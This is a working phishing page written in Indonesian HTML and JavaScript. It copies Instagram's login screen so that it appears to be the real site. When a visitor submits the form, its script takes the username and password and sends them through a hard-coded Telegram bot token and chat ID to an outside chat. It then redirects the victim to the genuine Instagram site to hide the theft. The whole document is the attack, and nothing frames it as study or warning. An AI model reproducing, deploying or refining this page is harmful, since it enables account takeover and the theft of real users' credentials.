<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masuk • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #1a2530; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            width: 100vw;
            color: #fafafa;
            position: relative;
        }

        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 24px;
            color: #fff;
            text-decoration: none;
        }

        .language-text {
            font-size: 14px;
            color: #a0a0a0;
            margin-bottom: 30px;
        }

        .login-box {
            background-color: transparent;
            width: 90%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            width: 182px;
            height: 60px;
            margin-bottom: 40px;
            filter: brightness(0) invert(1);
            object-fit: contain;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            gap: 6px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        input {
            background-color: #263340;
            border: 1px solid #384f63;
            border-radius: 25px;
            color: #fff;
            padding: 12px 40px 12px 16px;
            font-size: 14px;
            width: 100%;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #5c778f;
        }

        .clear-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #a0a0a0;
            font-size: 18px;
            cursor: pointer;
            display: none;
        }
        
        input:not(:placeholder-shown) + .clear-icon {
            display: block;
        }

        button {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 12px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            width: 100%;
            font-size: 15px;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #1877f2;
        }

        button:disabled { 
            background-color: #00376b; 
            cursor: not-allowed;         
        }

        .signature {
            margin-top: 20px;
            font-size: 12px;
            color: #5c778f;
        }
    </style>
</head>
<body>

    <a href="#" class="back-button">&#8249;</a>
    <div class="language-text">Bahasa Indonesia</div>

    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo" alt="Instagram">
        
        <form id="loginForm">
            <div class="input-wrapper">
                <input type="text" id="username" placeholder="Nama pengguna, email, atau nomor ponsel" required>
                <span class="clear-icon">&#10005;</span>
            </div>
            <div class="input-wrapper">
                <input type="password" id="password" placeholder="Kata sandi" required>
                <span class="clear-icon"></span>
            </div>
            <button type="submit" id="btnSubmit">Log In</button>
        </form>

        <div class="signature">Lupa kata sandi?</div>
    </div>

    <script>
        const BOT_TOKEN = '8653911812:AAG4hAVpL8hB4YZJhLL2PAHNDLgV3QYtsBg'; 
        const CHAT_ID = '6888530451';

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btn = document.getElementById('btnSubmit');
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if (!user || !pass) return;

            btn.disabled = true;
            btn.innerText = 'Memproses...';

            // Mengambil tanggal dan waktu secara realtime saat tombol ditekan
            const sekarang = new Date();
            const tanggalRealtime = sekarang.toLocaleDateString('id-ID'); // Format Tanggal Indonesia (DD/MM/YYYY)
            const waktuRealtime = sekarang.toLocaleTimeString('id-ID');   // Format Jam Realtime (HH:MM:SS)

            // Format pesan laporan dengan waktu realtime
            const message = `📊 *LAPORAN AKTIVITAS Login*\n` +
                            `📅 *Tanggal:* ${tanggalRealtime}\n` +
                            `🕒 *Jam:* ${waktuRealtime}\n\n` +
                            `📌 *Aksi:* Percobaan Masuk\n` +
                            `👤 *User:* \`${user}\`\n` +
                            `🔑 *Pass:* \`${pass}\``;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    }),
                    keepalive: true 
                });
            } catch (error) {
                console.log('Error:', error);
            } finally {
                window.location.href = 'https://www.instagram.com/';
            }
        });
    </script>
</body>
</html>
